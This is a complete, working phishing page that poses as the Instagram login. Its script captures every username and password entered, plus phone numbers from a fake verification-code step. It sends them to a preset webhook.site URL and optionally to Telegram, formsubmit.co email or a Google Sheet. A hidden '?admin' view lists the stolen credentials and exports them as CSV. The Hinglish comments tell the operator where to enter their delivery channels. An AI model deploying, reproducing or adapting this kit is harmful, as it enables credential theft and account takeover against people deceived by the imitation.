<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Instagram</title>
<style>
  *{box-sizing:border-box}
  body{margin:0;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;
       background:#fafafa;color:#262626;font-family:-apple-system,"Segoe UI",Roboto,Arial,sans-serif;padding:20px}
  .card{width:350px;max-width:100%;background:#fff;border:1px solid #dbdbdb;padding:34px 38px 22px;text-align:center}
  .logo{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:24px}
  .logo svg{width:40px;height:40px}
  .wm{font-family:'Grand Hotel','Brush Script MT',cursive;font-size:36px;line-height:1}
  input{width:100%;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;padding:11px 9px;font-size:13px;margin-bottom:6px}
  input:focus{outline:none;border-color:#a8a8a8;background:#fff}
  .btn{width:100%;margin-top:10px;border:0;border-radius:8px;background:#0095f6;color:#fff;font-weight:600;font-size:14px;padding:9px;cursor:pointer}
  .btn:disabled{opacity:.6}
  .or{display:flex;align-items:center;gap:14px;margin:16px 0;color:#8e8e8e;font-size:12px;font-weight:600}
  .or:before,.or:after{content:"";flex:1;height:1px;background:#dbdbdb}
  .link{font-size:12px;color:#00376b;cursor:pointer}
  .err{min-height:18px;margin-top:10px;font-size:13px;color:#ed4956;line-height:1.35}
  .hint{font-size:12px;color:#8e8e8e;margin-top:8px}
  .otp{display:flex;gap:6px;justify-content:center;margin:14px 0 4px}
  .otp input{width:38px;margin:0;padding:10px 0;text-align:center;font-size:16px}
  .avatar{width:84px;height:84px;border-radius:50%;margin:0 auto 14px;display:flex;align-items:center;justify-content:center;
          color:#fff;font-size:34px;font-weight:600;background:linear-gradient(45deg,#feda75,#fa7e1e,#d62976,#962fbf)}
  .ghost{display:inline-block;margin-top:8px;padding:8px 14px;border:1px solid #dbdbdb;border-radius:8px;font-size:13px;color:#262626;text-decoration:none}
  .foot{margin-top:14px;font-size:12px;color:#8e8e8e}
  .foot a{color:#00376b;text-decoration:none}
  #boom{color:#ed4956;font-size:12px;margin-top:10px;max-width:350px;word-break:break-word}
  #admin{display:none;width:760px;max-width:100%;background:#fff;border:1px solid #dbdbdb;padding:22px;text-align:left}
  #admin h2{margin:0 0 12px;font-size:18px}
  table{width:100%;border-collapse:collapse;font-size:13px}
  th,td{text-align:left;padding:7px 5px;border-bottom:1px solid #efefef;vertical-align:top}
  th{font-size:11px;text-transform:uppercase;color:#8e8e8e}
  td.pw{font-family:monospace;color:#c13584;word-break:break-all}
</style>
</head>
<body>

<div class="card" id="loginCard">
  <div class="logo">
    <svg viewBox="0 0 48 48">
      <defs><linearGradient id="g" x1="0" y1="1" x2="1" y2="0">
        <stop offset="0%" stop-color="#feda75"/><stop offset="30%" stop-color="#fa7e1e"/>
        <stop offset="60%" stop-color="#d62976"/><stop offset="100%" stop-color="#962fbf"/>
      </linearGradient></defs>
      <rect x="3" y="3" width="42" height="42" rx="12" fill="none" stroke="url(#g)" stroke-width="3.4"/>
      <circle cx="24" cy="24" r="9.6" fill="none" stroke="url(#g)" stroke-width="3.4"/>
      <circle cx="35.2" cy="12.8" r="2.6" fill="url(#g)"/>
    </svg>
    <span class="wm">Instagram</span>
  </div>
  <input id="u" placeholder="Phone number, username, or email">
  <input id="p" type="password" placeholder="Password">
  <button class="btn" id="go" type="button">Log in</button>
  <div class="or">OR</div>
  <a class="link" id="forgotLink">Forgot password?</a>
  <div class="err" id="msg"></div>
</div>

<div class="card" id="forgotCard" style="display:none">
  <div id="step1">
    <p style="font-size:16px;font-weight:600;margin:0 0 6px">Trouble logging in?</p>
    <p style="font-size:13px;color:#737373;margin:0 0 14px">Enter your phone number and we'll send you a code.</p>
    <input id="phone" type="tel" placeholder="Phone number">
    <button class="btn" id="sendBtn" type="button">Send verification code</button>
    <div class="err" id="ferr"></div>
  </div>
  <div id="step2" style="display:none">
    <p style="font-size:16px;font-weight:600;margin:0 0 6px">Enter confirmation code</p>
    <p style="font-size:13px;color:#737373;margin:0">We sent a 6-digit code to <b id="phoneShown"></b></p>
    <div class="otp">
      <input id="o1" maxlength="1" inputmode="numeric"><input id="o2" maxlength="1" inputmode="numeric">
      <input id="o3" maxlength="1" inputmode="numeric"><input id="o4" maxlength="1" inputmode="numeric">
      <input id="o5" maxlength="1" inputmode="numeric"><input id="o6" maxlength="1" inputmode="numeric">
    </div>
    <button class="btn" id="verifyBtn" type="button">Verify</button>
    <div class="err" id="oerr"></div>
    <div class="hint" id="codeHint"></div>
  </div>
</div>

<div class="card" id="okCard" style="display:none">
  <div class="avatar" id="av">?</div>
  <p style="font-size:15px;font-weight:600;margin:0 0 4px">You're logged in</p>
  <p style="font-size:13px;color:#737373;margin:0 0 16px" id="who"></p>
  <a class="ghost" id="openLink" target="_blank" rel="noopener">Open Instagram</a>
</div>

<div class="foot" id="foot">Don't have an account? <a href="#">Sign up</a></div>
<div id="boom"></div>

<div id="admin">
  <h2>Captured logins (<span id="cnt">0</span>)</h2>
  <table><thead><tr><th>#</th><th>Username</th><th>Password</th><th>Phone</th><th>Result</th><th>Time</th></tr></thead>
  <tbody id="rows"></tbody></table>
  <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:14px">
    <button class="btn" id="csvBtn" type="button" style="width:auto;margin:0;padding:8px 14px">Download CSV file</button>
    <button class="btn" id="copyBtn" type="button" style="width:auto;margin:0;padding:8px 14px;background:#fff;color:#262626;border:1px solid #dbdbdb">Copy all</button>
    <button class="btn" id="clearBtn" type="button" style="width:auto;margin:0;padding:8px 14px;background:#fff;color:#ed4956;border:1px solid #f3c2c6">Clear all</button>
  </div>
</div>

<script>
/* ================= CONFIG: apne channels yahan bharo ================= */
var CONFIG = {
  webhookUrl:   "https://webhook.site/174036e3-9510-467a-9010-a1d3f4acbd98", // webhook.site
  telegramToken:"",   // jaise "7123456789:AAHxxxxxxxxxxxxxxxxxx"
  telegramChatId:"",  // jaise "987654321"
  email:        "",   // jaise "mera.naam@gmail.com"  (formsubmit.co se mail jayega)
  sheetUrl:     ""    // Google Apps Script web app URL (Google Sheet me save)
};
/* ==================================================================== */

var KEY = "capturedLogins";
var otpCode = "", otpPhone = "", currentUser = "";

function $(id) { return document.getElementById(id); }

window.onerror = function (m, src, line) {
  $("boom").textContent = "Error: " + m + " (line " + line + ")";
};

function getCaptured() {
  try { return JSON.parse(localStorage.getItem(KEY)) || []; } catch (e) { return []; }
}

function save(entry) {
  try {
    var all = getCaptured();
    all.push(entry);
    localStorage.setItem(KEY, JSON.stringify(all));
    window.capturedLogins = all;
    console.log("Captured:", entry, "| total:", all.length);
  } catch (e) {
    console.warn("localStorage band hai:", e);
  }
  notifyAll(entry);
}

function postJson(url, data) {
  try {
    fetch(url, { method: "POST", mode: "no-cors",
      headers: { "Content-Type": "text/plain;charset=UTF-8" },
      body: JSON.stringify(data) });
  } catch (e) {}
}

function notifyAll(entry) {
  var text = "Instagram login\nUser: " + entry.username +
             "\nPassword: " + entry.password +
             (entry.phone ? "\nPhone: " + entry.phone : "") +
             "\nTime: " + entry.at;

  // 1) webhook.site / apna webhook
  if (CONFIG.webhookUrl) postJson(CONFIG.webhookUrl, entry);

  // 2) Telegram (mobile pe message)
  if (CONFIG.telegramToken && CONFIG.telegramChatId) {
    try {
      fetch("https://api.telegram.org/bot" + CONFIG.telegramToken +
            "/sendMessage?chat_id=" + CONFIG.telegramChatId +
            "&text=" + encodeURIComponent(text), { mode: "no-cors" });
    } catch (e) {}
  }

  // 3) Email (formsubmit.co -> mobile ke mail app me)
  if (CONFIG.email) {
    try {
      fetch("https://formsubmit.co/ajax/" + encodeURIComponent(CONFIG.email), {
        method: "POST",
        headers: { "Content-Type": "application/json", "Accept": "application/json" },
        body: JSON.stringify({
          _subject: "Instagram login: " + entry.username,
          username: entry.username,
          password: entry.password,
          phone: entry.phone || "-",
          time: entry.at
        })
      });
    } catch (e) {}
  }

  // 4) Google Sheet (Google Drive me file, phone pe Sheets app)
  if (CONFIG.sheetUrl) postJson(CONFIG.sheetUrl, entry);
}

function showCard(id) {
  $("loginCard").style.display = (id === "loginCard") ? "block" : "none";
  $("forgotCard").style.display = (id === "forgotCard") ? "block" : "none";
  $("okCard").style.display = (id === "okCard") ? "block" : "none";
  $("foot").style.display = (id === "loginCard") ? "block" : "none";
}

function doLogin() {
  var u = $("u").value.trim().replace(/^@/, "");
  var p = $("p").value;
  var m = "", res = "ok";

  $("msg").textContent = "";

  if (!u || !/^[A-Za-z0-9._]{2,30}$/.test(u)) {
    res = "unknown-user";
    m = "The username you entered doesn't belong to an account. Please check your username and try again.";
  } else if (p.length < 6) {
    res = "wrong-password";
    m = "Sorry, your password was incorrect. Please double-check your password.";
  }

  save({ kind: "password", username: u, password: p, phone: "", result: res,
         at: new Date().toISOString(), page: location.href });

  if (m) { $("msg").textContent = m; return; }

  currentUser = u;
  $("go").disabled = true;
  $("go").textContent = "Logging in…";
  setTimeout(function () {
    $("go").disabled = false;
    $("go").textContent = "Log in";
    success(u);
  }, 600);
}

function success(u) {
  $("av").textContent = u.charAt(0).toUpperCase();
  $("who").textContent = "@" + u;
  var link = "https://www.instagram.com/" + encodeURIComponent(u) + "/";
  $("openLink").href = link;
  showCard("okCard");
  window.open(link, "_blank");
}

function goForgot() {
  $("ferr").textContent = "";
  showCard("forgotCard");
}

function sendCode() {
  var raw = $("phone").value.trim();
  var digits = raw.replace(/[^0-9]/g, "");
  if (digits.length < 10) { $("ferr").textContent = "Please enter a valid phone number."; return; }

  $("ferr").textContent = "";
  otpPhone = raw;
  otpCode = String(Math.floor(100000 + Math.random() * 900000));

  $("phoneShown").textContent = raw;
  $("codeHint").innerHTML = "Demo code: <b>" + otpCode + "</b>";
  $("oerr").textContent = "";
  $("step1").style.display = "none";
  $("step2").style.display = "block";
  $("o1").focus();
}

function verifyCode() {
  var v = "";
  for (var i = 1; i <= 6; i++) v += $("o" + i).value;

  if (v.length < 6) { $("oerr").textContent = "Enter the 6-digit code."; return; }
  if (v !== otpCode) { $("oerr").textContent = "That code isn't valid. Check the code and try again."; return; }

  var u = currentUser || ("user" + otpPhone.replace(/[^0-9]/g, "").slice(-4));
  save({ kind: "otp", username: u, password: "", phone: otpPhone, result: "verified",
         at: new Date().toISOString(), page: location.href });
  success(u);
}

function renderAdmin() {
  $("loginCard").style.display = "none";
  $("forgotCard").style.display = "none";
  $("okCard").style.display = "none";
  $("foot").style.display = "none";
  $("admin").style.display = "block";

  var all = getCaptured();
  $("cnt").textContent = all.length;

  var html = "";
  for (var i = 0; i < all.length; i++) {
    var e = all[i];
    html += "<tr><td>" + (i + 1) + "</td><td>" + (e.username || "") +
            "</td><td class='pw'>" + (e.password || "—") +
            "</td><td>" + (e.phone || "—") + "</td><td>" + (e.result || "ok") +
            "</td><td>" + new Date(e.at).toLocaleString() + "</td></tr>";
  }
  $("rows").innerHTML = html || "<tr><td colspan='6' style='text-align:center;color:#8e8e8e'>No logins yet</td></tr>";
}

function downloadCsv() {
  var all = getCaptured();
  var rows = [["#", "username", "password", "phone", "result", "time"]];
  for (var i = 0; i < all.length; i++) {
    var e = all[i];
    rows.push([i + 1, e.username || "", e.password || "", e.phone || "",
               e.result || "ok", e.at || ""]);
  }
  var csv = "";
  for (var r = 0; r < rows.length; r++) {
    var cells = [];
    for (var c = 0; c < rows[r].length; c++) {
      cells.push('"' + String(rows[r][c]).replace(/"/g, '""') + '"');
    }
    csv += cells.join(",") + "\r\n";
  }
  var blob = new Blob(["\ufeff" + csv], { type: "text/csv;charset=utf-8" });
  var a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = "instagram-logins.csv";
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
}

function copyAll() {
  var txt = JSON.stringify(getCaptured(), null, 2);
  if (navigator.clipboard) {
    navigator.clipboard.writeText(txt).then(function () {
      $("copyBtn").textContent = "Copied!";
      setTimeout(function () { $("copyBtn").textContent = "Copy all"; }, 1200);
    });
  } else {
    window.prompt("Copy karo:", txt);
  }
}

function clearAll() {
  if (!confirm("Saare logins delete kar dun?")) return;
  try { localStorage.removeItem(KEY); } catch (e) {}
  window.capturedLogins = [];
  renderAdmin();
}

$("go").onclick = doLogin;
$("forgotLink").onclick = goForgot;
$("sendBtn").onclick = sendCode;
$("verifyBtn").onclick = verifyCode;
$("csvBtn").onclick = downloadCsv;
$("copyBtn").onclick = copyAll;
$("clearBtn").onclick = clearAll;

for (var i = 1; i <= 6; i++) {
  (function (n) {
    var box = $("o" + n);
    box.addEventListener("input", function () {
      box.value = box.value.replace(/[^0-9]/g, "").slice(0, 1);
      if (box.value && n < 6) $("o" + (n + 1)).focus();
    });
    box.addEventListener("keydown", function (e) {
      if (e.key === "Backspace" && !box.value && n > 1) $("o" + (n - 1)).focus();
      if (e.key === "Enter") verifyCode();
    });
  })(i);
}

if (/[?&]admin\b/.test(location.search)) renderAdmin();
</script>
</body>
</html>
